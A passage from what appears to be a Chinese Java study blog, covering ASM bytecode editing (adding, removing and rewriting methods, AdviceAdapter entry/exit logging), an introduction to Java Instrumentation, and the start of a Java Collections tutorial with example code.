<span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.visitEnd();</span><br><span class="line">                MethodVisitor mv = cv.visitMethod(Opcodes.ACC_PUBLIC, <span class="string">&quot;xyz&quot;</span>, <span class="string">&quot;(ILjava/lang/String;)V&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">if</span> (mv != <span class="keyword">null</span>) mv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, ClassReader.SKIP_CODE | ClassReader.SKIP_DEBUG);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain2.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用<code>javap</code>查看MyMain2的字节码</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104142030332.png" alt="image-20220104142030332"></p>
<h4 id="四、移除方法和字段"><a href="#四、移除方法和字段" class="headerlink" title="四、移除方法和字段"></a>四、移除方法和字段</h4><h5 id="a-移除的本质在于"><a href="#a-移除的本质在于" class="headerlink" title="a. 移除的本质在于"></a>a. 移除的本质在于</h5><p>将visit方法（visitField和visitMethod）<strong>返回null</strong></p>
<h5 id="b-示例"><a href="#b-示例" class="headerlink" title="b. 示例"></a>b. 示例</h5><p>以下MyMain类为例，删除abc字段和xyz方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> abc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> def = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">xyz</span><span class="params">(<span class="keyword">int</span> a, String b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, Object o)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;abc&quot;</span>.equals(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitField(i, s, s1, s2, o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;xyz&quot;</span>.equals(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, ClassReader.SKIP_CODE | ClassReader.SKIP_DEBUG);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain2.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>javap</code>查看MyMain2的字节码发现只剩下def字段和foo方法了</p>
<h4 id="五、修改方法内容"><a href="#五、修改方法内容" class="headerlink" title="五、修改方法内容"></a>五、修改方法内容</h4><h5 id="修改的本质"><a href="#修改的本质" class="headerlink" title="修改的本质"></a>修改的本质</h5><p>移除+新增</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> MyMain().foo(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;  <span class="comment">// 修改为 return a+100;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(<span class="number">0</span>);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;foo&quot;</span>.equals(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.visitEnd();</span><br><span class="line">                MethodVisitor mv = cv.visitMethod(Opcodes.ACC_PUBLIC, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;(I)I&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                mv.visitCode();</span><br><span class="line">                mv.visitVarInsn(Opcodes.ILOAD, <span class="number">1</span>);</span><br><span class="line">                mv.visitIntInsn(Opcodes.BIPUSH, <span class="number">100</span>);</span><br><span class="line">                mv.visitInsn(Opcodes.IADD);</span><br><span class="line">                mv.visitInsn(Opcodes.IRETURN);</span><br><span class="line">                mv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104145839022.png" alt="image-20220104145839022"></p>
<h5 id="ClassFormatError异常"><a href="#ClassFormatError异常" class="headerlink" title="ClassFormatError异常"></a>ClassFormatError异常</h5><p>执行<code>java -cp . MyMain</code>报错，提示入参无法放到局部变量表。</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104150249362.png" alt="image-20220104150249362"></p>
<p>解决方法：<strong>让ASM自动计算stack和locals</strong>。这与ClassWriter构造器方法参数有关。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>构造器参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>new ClassWriter(0)</td>
<td>不自动计算操作数栈和局部变量大小，需要手动指定</td>
</tr>
<tr>
<td>new ClassWriter(ClassWriter.COMPUTE_MAXS)</td>
<td>自动计算操作数栈和局部变量大小，前提是需要调用visitMaxs方法触发计算上述两个值，参数可以随意指定</td>
</tr>
<tr>
<td>new ClassWriter(ClassWriter.COMPUTE_FRAMES)</td>
<td>除了操作数栈和局部变量大小，还会自动计算StackMapFrames</td>
</tr>
</tbody>
</table>
</div>
<p>修改代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        <span class="comment">// 指定ClassWriter自动计算</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;foo&quot;</span>.equals(s)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">super</span>.visitEnd();</span><br><span class="line">                MethodVisitor mv = cv.visitMethod(Opcodes.ACC_PUBLIC, <span class="string">&quot;foo&quot;</span>, <span class="string">&quot;(I)I&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                mv.visitCode();</span><br><span class="line">                mv.visitVarInsn(Opcodes.ILOAD, <span class="number">1</span>);</span><br><span class="line">                mv.visitIntInsn(Opcodes.BIPUSH, <span class="number">100</span>);</span><br><span class="line">                mv.visitInsn(Opcodes.IADD);</span><br><span class="line">                mv.visitInsn(Opcodes.IRETURN);</span><br><span class="line">                <span class="comment">// 触发计算</span></span><br><span class="line">                mv.visitMaxs(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">                mv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>
<p>再次执行MyMain，正常运行。</p>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104151054651.png" alt="image-20220104151054651"></p>
<h4 id="六、AdviceAdapter使用"><a href="#六、AdviceAdapter使用" class="headerlink" title="六、AdviceAdapter使用"></a>六、AdviceAdapter使用</h4><h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>在方法的开始和结束插入代码</p>
<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.*;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.AdviceAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.ASM5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASMOut</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = Files.readAllBytes(<span class="keyword">new</span> File(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>).toPath());</span><br><span class="line">        ClassReader cr = <span class="keyword">new</span> ClassReader(bytes);</span><br><span class="line">        <span class="comment">// 指定ClassWriter自动计算</span></span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);</span><br><span class="line">        ClassVisitor cv = <span class="keyword">new</span> ClassVisitor(ASM5, cw) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> i, String s, String s1, String s2, String[] strings)</span> </span>&#123;</span><br><span class="line">                MethodVisitor mv = <span class="keyword">super</span>.visitMethod(i, s, s1, s2, strings);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;foo&quot;</span>.equals(s)) <span class="keyword">return</span> mv;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> AdviceAdapter(ASM5, mv, i, s, s1) &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMethodEnter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        <span class="comment">// 新增 System.out.println(&quot;enter &quot; + s);</span></span><br><span class="line">                        <span class="keyword">super</span>.onMethodEnter();</span><br><span class="line">                        mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">                        mv.visitLdcInsn(<span class="string">&quot;enter &quot;</span> + s);</span><br><span class="line">                        mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMethodExit</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">                        <span class="comment">// 新增 System.out.println(&quot;[normal, err] exit &quot; + s);</span></span><br><span class="line">                        <span class="keyword">super</span>.onMethodExit(i);</span><br><span class="line">                        mv.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (i == Opcodes.ATHROW) &#123;</span><br><span class="line">                            mv.visitLdcInsn(<span class="string">&quot;err exit &quot;</span> + s);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            mv.visitLdcInsn(<span class="string">&quot;normal exit &quot;</span> + s);</span><br><span class="line">                        &#125;</span><br><span class="line">                        mv.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        cr.accept(cv, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytesModified = cw.toByteArray();</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;F:\\java\\ASMTest\\src\\MyMain.class&quot;</span>), bytesModified);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E5%AD%97%E8%8A%82%E7%A0%81/image-20220104152825993.png" alt="image-20220104152825993"></p>
<h4 id="七、给方法加上try-catch"><a href="#七、给方法加上try-catch" class="headerlink" title="七、给方法加上try catch"></a>七、给方法加上try catch</h4><h2 id="7-Java-Instrumentation原理"><a href="#7-Java-Instrumentation原理" class="headerlink" title="7 Java Instrumentation原理"></a>7 Java Instrumentation原理</h2><h3 id="7-1-Java-Instrumentation简介"><a href="#7-1-Java-Instrumentation简介" class="headerlink" title="7.1 Java Instrumentation简介"></a>7.1 Java Instrumentation简介</h3><p>JDK 1.5版本后引入<code>java.lang.instrument</code>包，可以实现字节码增强，其核心功能由<code>java.lang.instrument.Instrumentation</code>提供，该接口的方法提供了注册类文件转换器、获取所有已加载的类等功能，允许我们修改已加载或未加载的类，实现AOP、性能监控等功能。</p>
<h4 id="一、修改字节码的基本过程"><a href="#一、修改字节码的基本过程" class="headerlink" title="一、修改字节码的基本过程"></a>一、修改字节码的基本过程</h4><h5 id="Instrumentation的常用组成"><a href="#Instrumentation的常用组成" class="headerlink" title="Instrumentation的常用组成"></a>Instrumentation的常用组成</h5><p><code>Instrumentation</code>接口的<code>addTransformer</code>方法给<code>Instrumentation</code>注册一个类型为<code>ClassFileTransformer</code>的类文件转换器，<code>ClassFileTransformer</code>接口只有一个<code>transform</code>方法。</p>
<h5 id="修改字节码的过程"><a href="#修改字节码的过程" class="headerlink" title="修改字节码的过程"></a>修改字节码的过程</h5><p>调用<code>addTransformer</code>注册<code>transform</code>以后，后续所有JVM加载类都会被<code>transform</code>方法拦截，这个方法接受了原类文件的字节数组，在这个方法中可以做任意修改，最后返回转换过的字节数组，由JVM加载这个修改后的类文件。</p>
<p>如果<code>transform</code>方法返回null，则表示不做处理；如果返回值不为null，则说明，JVM会用返回的字节数组替换原来类的字节数组。</p>
<h5 id="接口的其他方法"><a href="#接口的其他方法" class="headerlink" title="接口的其他方法"></a>接口的其他方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">retransformClasses				<span class="comment">// 对JVM已加载的类重新触发类加载</span></span><br><span class="line">getAllLoadedClasses				<span class="comment">// 获取当前JVM加载的所有类对象</span></span><br><span class="line">isRetransformClassesSupported	<span class="comment">// 当前JVM配置是否支持类重新转换的特性</span></span><br></pre></td></tr></table></figure>
<h5 id="Instrumentation的两种使用方法"><a href="#Instrumentation的两种使用方法" class="headerlink" title="Instrumentation的两种使用方法"></a>Instrumentation的两种使用方法</h5><p>（1）在JVM启动时添加一个Agent的jar包</p>
<p>（2）JVM运行以后在任意时刻通过Attach API远程加载Agent的jar包</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Java集合框架</title>
    <url>/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<p>集合的概念</p>
<p>Collection接口</p>
<p>List接口与实现类</p>
<p>泛型和工具类</p>
<p>Set接口与实现类</p>
<p>Map接口与实现类</p>
<h2 id="1-集合"><a href="#1-集合" class="headerlink" title="1 集合"></a>1 集合</h2><h3 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h3><p>对象的容器，定义了对对象操作的常用方法。类似数组的功能。</p>
<h3 id="二、与数组的区别"><a href="#二、与数组的区别" class="headerlink" title="二、与数组的区别"></a>二、与数组的区别</h3><p>（1）数组长度固定，集合长度不固定</p>
<p>（2）数组可以存储基本类型和引用类型，集合只能存储引用类型</p>
<h3 id="三、集合所在位置"><a href="#三、集合所在位置" class="headerlink" title="三、集合所在位置"></a>三、集合所在位置</h3><p><code>java.util.*;</code></p>
<h2 id="2-Collection体系"><a href="#2-Collection体系" class="headerlink" title="2 Collection体系"></a>2 Collection体系</h2><p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211220112728731.png" alt="image-20211220112728731"></p>
<h2 id="3-Collection父接口"><a href="#3-Collection父接口" class="headerlink" title="3 Collection父接口"></a>3 Collection父接口</h2><h3 id="一、特点"><a href="#一、特点" class="headerlink" title="一、特点"></a>一、特点</h3><p>部分有序、部分无序；部分可重复、部分不可重复。</p>
<h3 id="二、方法"><a href="#二、方法" class="headerlink" title="二、方法"></a>二、方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">add</span><span class="params">(Object obj)</span>  <span class="comment">// 添加一个对象</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection c)</span>  <span class="comment">// 将一个集合中的所有对象添加到此集合中  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span>  <span class="comment">// 清空此集合中所有对象</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span>  <span class="comment">// 检查此集合中是否包含o对象</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span>  <span class="comment">// 比较此集合是否与指定对象相等</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span>  <span class="comment">// 集合是否为空</span></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span>  <span class="comment">// 在此集合中移除o对象</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span>  <span class="comment">// 返回此集合中的元素个数</span></span></span><br><span class="line"><span class="function">Object[] <span class="title">toArray</span><span class="params">()</span>  <span class="comment">// 将此集合转换成数组</span></span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><p>拓展：JDK API 文档</p>
<p><a href="https://docs.oracle.com/en/java/javase/11/docs/api/index.html">https://docs.oracle.com/en/java/javase/11/docs/api/index.html</a></p>
<p><img src="/2021/12/20/Java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/image-20211220113805340.png" alt="image-20211220113805340"></p>
</li>
</ul>
<hr>
<h2 id="4-Collection使用（1）"><a href="#4-Collection使用（1）" class="headerlink" title="4 Collection使用（1）"></a>4 Collection使用（1）</h2><h3 id="一、注意"><a href="#一、注意" class="headerlink" title="一、注意"></a>一、注意</h3><p>由于没有下标，所以Collection中的元素遍历需要用<code>foreach</code>或者迭代器<code>Iterator</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建集合</span></span><br><span class="line">        Collection collection = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加元素</span></span><br><span class="line">        collection.add(<span class="string">&quot;苹果&quot;</span>);</span><br><span class="line">        collection.add(<span class="string">&quot;西瓜&quot;</span>);</span><br><span class="line">        collection.add(<span class="string">&quot;榴莲&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;元素个数：&quot;</span> + collection.size());</span><br><span class="line">        System.out.println(collection);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 删除元素</span></span><br><span class="line"><span class="comment">//        collection.remove(&quot;榴莲&quot;);</span></span><br><span class="line"><span class="comment">//        collection.clear();</span></span><br><span class="line"><span class="comment">//        System.out.println(collection);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 foreach</span></span><br><span class="line">        <span class="keyword">for</span> (Object o : collection) &#123;</span><br><span class="line">            System.out.println(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 迭代器</span></span><br><span class="line">        Iterator it = collection.iterator();</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            String s = (String)it.next();</span><br><span class="line">            System.out.println(s);</span><br><span class="line">            it.remove();  <span class="comment">// 不能使用collection.remove()</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断</span></span><br><span class="line">        System.out.println(collection.contains(<span class="string">&quot;西瓜&quot;</span>));</span><br><span class="line">        System.out.println(collection.isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，在迭代过程中，应使用迭代器的删除方法而不应使用collection的删除方法。</p>
